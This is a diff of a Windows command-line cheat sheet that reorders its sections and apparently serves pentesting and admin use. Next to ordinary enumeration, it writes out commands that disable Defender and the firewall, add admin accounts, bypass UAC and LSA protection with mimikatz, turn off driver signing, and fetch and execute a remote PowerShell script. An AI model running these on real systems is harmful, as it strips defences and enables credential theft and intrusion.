@@ -4,49 +4,56 @@ title: Sysadmin WIN CLI
 category: Sysadmin
 parent: Sysadmin
 grand_parent: Cheatsheets
-modified_date: 2023-04-12
-permalink: /sys/win-cli
+modified_date: 2023-06-03
+permalink: /sys/win
 ---
 
 **MENU**
 
 <!-- vscode-markdown-toc -->
-* 1. [Listing the System Config](#ListingtheSystemConfig)
-	* 1.1. [OS and KB config](#OSandKBconfig)
-	* 1.2. [network config & file shares](#networkconfigfileshares)
-	* 1.3. [users & groups](#usersgroups)
-	* 1.4. [active sessions](#activesessions)
-	* 1.5. [user accounts activity](#useraccountsactivity)
-	* 1.6. [products, processes and services](#productsprocessesandservices)
-* 2. [Checking the Security Components](#CheckingtheSecurityComponents)
-	* 2.1. [windows firewall status](#windowsfirewallstatus)
-	* 2.2. [windows defender status](#windowsdefenderstatus)
-	* 2.3. [Credential Guard status](#CredentialGuardstatus)
-	* 2.4. [PPL status](#PPLstatus)
-* 3. [Tampering the Operating System](#TamperingtheOperatingSystem)
-	* 3.1. [Keyboard Layout](#KeyboardLayout)
-	* 3.2. [User accounts](#Useraccounts)
-	* 3.3. [configure network](#configurenetwork)
-	* 3.4. [activate RDP](#activateRDP)
-	* 3.5. [activate PSRemoting](#activatePSRemoting)
-	* 3.6. [download ps activedirectory module](#downloadpsactivedirectorymodule)
-	* 3.7. [windows defender: disable](#windowsdefender:disable)
-	* 3.8. [windows firewall: disable](#windowsfirewall:disable)
-	* 3.9. [Credential Guard: disable](#CredentialGuard:disable)
-	* 3.10. [PPL: disable](#PPL:disable)
-	* 3.11. [windows uac: bypass](#windowsuac:bypass)
-	* 3.12. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
-	* 3.13. [Windows driver signature: disable](#Windowsdriversignature:disable)
-	* 3.14. [SMBv1: enable](#SMBv1:enable)
-* 4. [Hardening the Operating System](#HardeningtheOperatingSystem)
-	* 4.1. [LLMNR: disable](#LLMNR:disable)
-	* 4.2. [MS-MSDT: disable](#MS-MSDT:disable)
-* 5. [Windows DISM](#WindowsDISM)
-* 6. [Windows WSL manual distro install](#WindowsWSLmanualdistroinstall)
-* 7. [Obfuscation & Detection bypass](#ObfuscationDetectionbypass)
+* [enum](#enum)
+	* [get-os](#get-os)
+	* [get-kb](#get-kb)
+	* [get-netconf](#get-netconf)
+	* [get-shares](#get-shares)
+	* [get-users](#get-users)
+	* [get-products](#get-products)
+	* [get-processes](#get-processes)
+	* [get-services](#get-services)
+	* [get-sessions](#get-sessions)
+	* [last-sessions](#last-sessions)
+* [enum-sec](#enum-sec)
+	* [get-status-fw](#get-status-fw)
+	* [get-status-defender](#get-status-defender)
+	* [get-status-cred-guard](#get-status-cred-guard)
+	* [get-status-ppl](#get-status-ppl)
+* [tamper](#tamper)
+	* [add-account](#add-account)
+	* [set-kb](#set-kb)
+	* [set-netconf](#set-netconf)
+	* [set-rdp](#set-rdp)
+	* [set-winrm](#set-winrm)
+	* [set-smbv1](#set-smbv1)
+	* [unset-fw](#unset-fw)
+	* [unset-defender](#unset-defender)
+	* [unset-cred-guard](#unset-cred-guard)
+	* [unset-ppl](#unset-ppl)
+	* [unset-sigcheck](#unset-sigcheck)
+	* [dl-ps-ad-module](#dl-ps-ad-module)
+* [harden](#harden)
+	* [disable-llmnr](#disable-llmnr)
+	* [disable-ms-msdt](#disable-ms-msdt)
+* [bypass](#bypass)
+	* [bypass-uac](#bypass-uac)
+	* [bypass-lsaprotection](#bypass-lsaprotection)
+	* [bypass-sources](#bypass-sources)
+* [misc](#misc)
+	* [run](#run)
+	* [dism](#dism)
+	* [wsl](#wsl)
 
 <!-- vscode-markdown-toc-config
-	numbering=true
+	numbering=false
 	autoSave=true
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
@@ -56,13 +63,16 @@ permalink: /sys/win-cli
 * [windows logs](/sysadmin/sys-logs-win/)
 
 
-##  1. <a name='ListingtheSystemConfig'></a>Listing the System Config
-###  1.1. <a name='OSandKBconfig'></a>OS and KB config
+## <a name='enum'></a>enum
+### <a name='get-os'></a>get-os
 ```powershell
 # listing OS version
 wmic os list brief
 wmic os get MUILanguages
+```
 
+### <a name='get-kb'></a>get-kb
+```
 # listing KB wmi
 wmic qfe list full /format:table
 
@@ -71,7 +81,7 @@ powershell -Command "systeminfo /FO CSV" | out-file C:\Windows\Temp\systeminfo.c
 import-csv C:\Windows\Temp\systeminfo.csv | ForEach-Object{$_."Correctif(s)"}
 ```
 
-###  1.2. <a name='networkconfigfileshares'></a>network config & file shares
+### <a name='get-netconf'></a>get-netconf
 ```powershell
 # listing network hardware
 wmic nic list brief
@@ -82,7 +92,10 @@ wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,D
 ipconfig /all
 route -n
 netstat -ano
+```
 
+### <a name='get-shares'></a>get-shares
+```
 # listing network shares
 wmic netuse list brief
 net use
@@ -94,7 +107,7 @@ net share
 nltest /dclist:dom.corp
 ```
 
-###  1.3. <a name='usersgroups'></a>users & groups
+### <a name='get-users'></a>get-users
 ```powershell
 # listing local users
 wmic netlogin list brief
@@ -103,7 +116,27 @@ net localgroup
 net localgroup Administrators
 ```
 
-###  1.4. <a name='activesessions'></a>active sessions
+### <a name='get-products'></a>get-products
+```powershell
+# listing windows product
+wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:csv
+```
+
+### <a name='get-processes'></a>get-processes
+```powershell
+# listing windows services 
+wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:csv
+# winrm service
+Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
+```
+
+### <a name='get-services'></a>get-services
+```powershell
+# listing windows processes
+wmic process get CSName,Description,ExecutablePath,ProcessId /format:csv
+```
+
+### <a name='get-sessions'></a>get-sessions
 ```batch
 # listing the active sessions
 quser
@@ -112,7 +145,7 @@ quser
 logoff 2
 ```
 
-###  1.5. <a name='useraccountsactivity'></a>user accounts activity
+### <a name='last-sessions'></a>last-sessions
 ```powershell
 # global view
 wmic netlogin get Name,LastLogon,LastLogoff,NumberOfLogons,BadPasswordCount
@@ -127,34 +160,22 @@ Get-WinEvent -FilterHashtable @{'Logname'='Security';'id'=4624,4634} -Max 80 | W
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4624,4634;Data=$ztarg_usersid} -Max 80 |  select ID,TaskDisplayName,TimeCreated
 ```
 
-###  1.6. <a name='productsprocessesandservices'></a>products, processes and services
-```powershell
-# listing windows product
-wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:csv
-# listing windows processes
-wmic process get CSName,Description,ExecutablePath,ProcessId /format:csv
-# listing windows services 
-wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:csv
-# winrm service
-Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
-```
-
 # listing local users
-##  2. <a name='CheckingtheSecurityComponents'></a>Checking the Security Components
+## <a name='enum-sec'></a>enum-sec
 
-###  2.1. <a name='windowsfirewallstatus'></a>windows firewall status
+### <a name='get-status-fw'></a>get-status-fw
 ```batch
 # logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
 netsh advfirewall show allprofiles
 netsh firewall show portopening
 ```
 
-###  2.2. <a name='windowsdefenderstatus'></a>windows defender status
+### <a name='get-status-defender'></a>get-status-defender
 ```batch
 powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
 ```
 
-###  2.3. <a name='CredentialGuardstatus'></a>Credential Guard status
+### <a name='get-status-cred-guard'></a>get-status-cred-guard
 
 Run the following powershell commands as local administrator:
 
@@ -177,17 +198,11 @@ dir HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard*
 Reference :
  - [MSDN - Credential Guard Management](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)
 
-###  2.4. <a name='PPLstatus'></a>PPL status
+### <a name='get-status-ppl'></a>get-status-ppl
 
-##  3. <a name='TamperingtheOperatingSystem'></a>Tampering the Operating System
+## <a name='tamper'></a>tamper
 
-###  3.1. <a name='KeyboardLayout'></a>Keyboard Layout
-```powershell
-Set-WinUserLanguageList -Force "fr-FR"
-Set-WinUserLanguageList -Force "en-US"
-```
-
-###  3.2. <a name='Useraccounts'></a>User accounts
+### <a name='add-account'></a>add-account
 ```batch
 # create a local user account
 net user /ADD test test
@@ -203,14 +218,19 @@ net localgroup Administrators test /ADD
 net localgroup Administrators corp\test /ADD
 
 ```
+### <a name='set-kb'></a>set-kb
+```powershell
+Set-WinUserLanguageList -Force "fr-FR"
+Set-WinUserLanguageList -Force "en-US"
+```
 
-###  3.3. <a name='configurenetwork'></a>configure network
+### <a name='set-netconf'></a>set-netconf
 ```batch
 netsh interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
 netsh interface ip add dns "connection name" 8.8.8.8
 ```
 
-###  3.4. <a name='activateRDP'></a>activate RDP
+### <a name='set-rdp'></a>set-rdp
 
 ```powershell
 net localgroup "Remote Desktop Users" $zlat_user /add
@@ -218,7 +238,7 @@ net localgroup "Remote Desktop Users" $zlat_user /add
 
 Learn about session stealing at [hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp#session-stealing)
 
-###  3.5. <a name='activatePSRemoting'></a>activate PSRemoting
+### <a name='set-winrm'></a>set-winrm
 ```powershell
 # client: check winrm service status
 Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
@@ -233,59 +253,7 @@ Set-Item wsman:\localhost\client\trustedhosts -Value *
 Enable-PSRemoting
 ```
 
-###  3.6. <a name='downloadpsactivedirectorymodule'></a>download ps activedirectory module 
-```batch
-#version 1
-iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
-```
-
-###  3.7. <a name='windowsdefender:disable'></a>windows defender: disable
-```batch
-powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
-```
-
-
-###  3.8. <a name='windowsfirewall:disable'></a>windows firewall: disable
-```batch
-netsh advfirewall set publicprofile state off
-netsh advfirewall set privateprofile state off
-netsh advfirewall set domainprofile state off
-netsh advfirewall set allprofiles state off
-```
-
-###  3.9. <a name='CredentialGuard:disable'></a>Credential Guard: disable 
-```powershell
-```
-
-###  3.10. <a name='PPL:disable'></a>PPL: disable
-
-Tools that disable PPL flags on the LSASS process by patching the EPROCESS kernel 
- - [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
- - [PPLdump](https://github.com/itm4n/PPLdump)
- - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)
-
-```batch
-```
-
-###  3.11. <a name='windowsuac:bypass'></a>windows uac: bypass
-```batch
-powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
-```
-
-###  3.12. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
-```batch
-powershell .\ConsoleApplication1.exe/InstallDriver
-powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
-powershell .\mimikatz.exe
-```
-
-###  3.13. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
-```batch
-bcdedit.exe /set nointegritychecks on
-bcdedit.exe /set testsigning on
-```
-
-###  3.14. <a name='SMBv1:enable'></a>SMBv1: enable
+### <a name='set-smbv1'></a>set-smbv1
 ```powershell
 # DISM 
 DISM /online /enable-feature /featurename:SMB1Protocol
@@ -297,19 +265,119 @@ DISM /online /enable-feature /featurename:SMB1Protocol-Deprecation
 Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol
 ```
 
-##  4. <a name='HardeningtheOperatingSystem'></a>Hardening the Operating System
-###  4.1. <a name='LLMNR:disable'></a>LLMNR: disable
+### <a name='unset-fw'></a>unset-fw
+```batch
+netsh advfirewall set publicprofile state off
+netsh advfirewall set privateprofile state off
+netsh advfirewall set domainprofile state off
+netsh advfirewall set allprofiles state off
+```
+
+### <a name='unset-defender'></a>unset-defender
+```batch
+powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### <a name='unset-cred-guard'></a>unset-cred-guard 
+```powershell
+```
+
+### <a name='unset-ppl'></a>unset-ppl
+
+Tools that disable PPL flags on the LSASS process by patching the EPROCESS kernel 
+ - [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
+ - [PPLdump](https://github.com/itm4n/PPLdump)
+ - [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)
+
+```batch
+```
+
+### <a name='unset-sigcheck'></a>unset-sigcheck
+
+Windows driver signature: disable:
+```batch
+bcdedit.exe /set nointegritychecks on
+bcdedit.exe /set testsigning on
+```
+
+
+### <a name='dl-ps-ad-module'></a>dl-ps-ad-module 
+```batch
+#version 1
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+```
+
+## <a name='harden'></a>harden
+### <a name='disable-llmnr'></a>disable-llmnr
 ```
 REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient”
 REG ADD  “HKLM\Software\policies\Microsoft\Windows NT\DNSClient” /v ”EnableMulticast” /t REG_DWORD /d “0” /f
 ```
-###  4.2. <a name='MS-MSDT:disable'></a>MS-MSDT: disable
+### <a name='disable-ms-msdt'></a>disable-ms-msdt
 ```
 # MS-MSDT protocol used by follina exploit, CVE-2022-30190
 RED DEL "HKEY_CLASSES_ROOT\ms-msdt" /f
 ```
 
-##  5. <a name='WindowsDISM'></a>Windows DISM
+## <a name='bypass'></a>bypass
+
+### <a name='bypass-uac'></a>bypass-uac
+```batch
+powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
+```
+
+### <a name='bypass-lsaprotection'></a>bypass-lsaprotection
+```batch
+powershell .\ConsoleApplication1.exe/InstallDriver
+powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
+powershell .\mimikatz.exe
+```
+
+### <a name='bypass-sources'></a>bypass-sources
+
+- [Windows command-line obfuscation](https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation)
+- [powershell obfuscation using securestring](https://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring)
+
+## <a name='misc'></a>misc
+
+### <a name='run'></a>run
+
+| Name	 | Function |
+|--------|-------------|
+| Add/Remove Programs	 | appwiz.cpl |
+| Administrative Tools	 | control admintools |
+| Automatic Updates	| wuaucpl.cpl |
+| Bluetooth Transfer wizard	 | fsquirt |
+| Certificate Manager	| certmgr.msc |
+| Character Map	| charmap |
+| Control Panel	| control |
+| Computer Management	| compmgmt.msc |
+| Date and Time Properties | timedate.cpl |
+| Driver Verifier Utility | verifier |
+| Event Viewer	| eventvwr.msc |
+| File Signature Verification Tool	| sigverif |
+| Group Policy Editor | gpedit.msc |
+| Logs out of windows | logoff |
+| Malicious Software Removal Tool	| mrt |
+| Monitors Display | desk.cpl |
+| Network Connections	| ncpa.cpl |
+| Password Properties	| password.cpl |
+| Performance Monitor	| perfmon.msc |
+| Registry Editor	| regedit |
+| Remote Desktop	| mstsc |
+| Security Center	wscui.cpl
+| Sounds and Audio	| mmsys.cpl |
+| Shuts Down Windows | shutdown |
+| SQL Client Configuration	| cliconfg |
+| System Configuration Utility	| msconfig |
+| Task Manager	| taskmgr |
+| Task Scheduler | taskschd.msc |
+| User Account Management | nusrmgr.cpl |
+| Windows Firewall	| firewall.cpl |
+| Windows Version | winver |
+| Wordpad | Write |
+
+### <a name='dism'></a>dism
 ```powershell
 # Pre requisites: Admin rights
 # get all windows feature and save to a txt file
@@ -327,7 +395,8 @@ get-windowsoptionalfeature -online -featurename SMB1Protocol*
 get-windowsoptionalfeature -online -featurename SMB1Protocol* |ft
 ```
 
-##  6. <a name='WindowsWSLmanualdistroinstall'></a>Windows WSL manual distro install
+### <a name='wsl'></a>wsl
+Windows WSL manual distro install
 ```powershell
 # Note: By pass the GPO blocking the exec of the App Store app
 
@@ -347,8 +416,3 @@ Ubuntu.exe
 wslconfig /list /all
 wsl -l
 ```
-
-##  7. <a name='ObfuscationDetectionbypass'></a>Obfuscation & Detection bypass
-
-- [Windows command-line obfuscation](https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation)
-- [powershell obfuscation using securestring](https://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring)
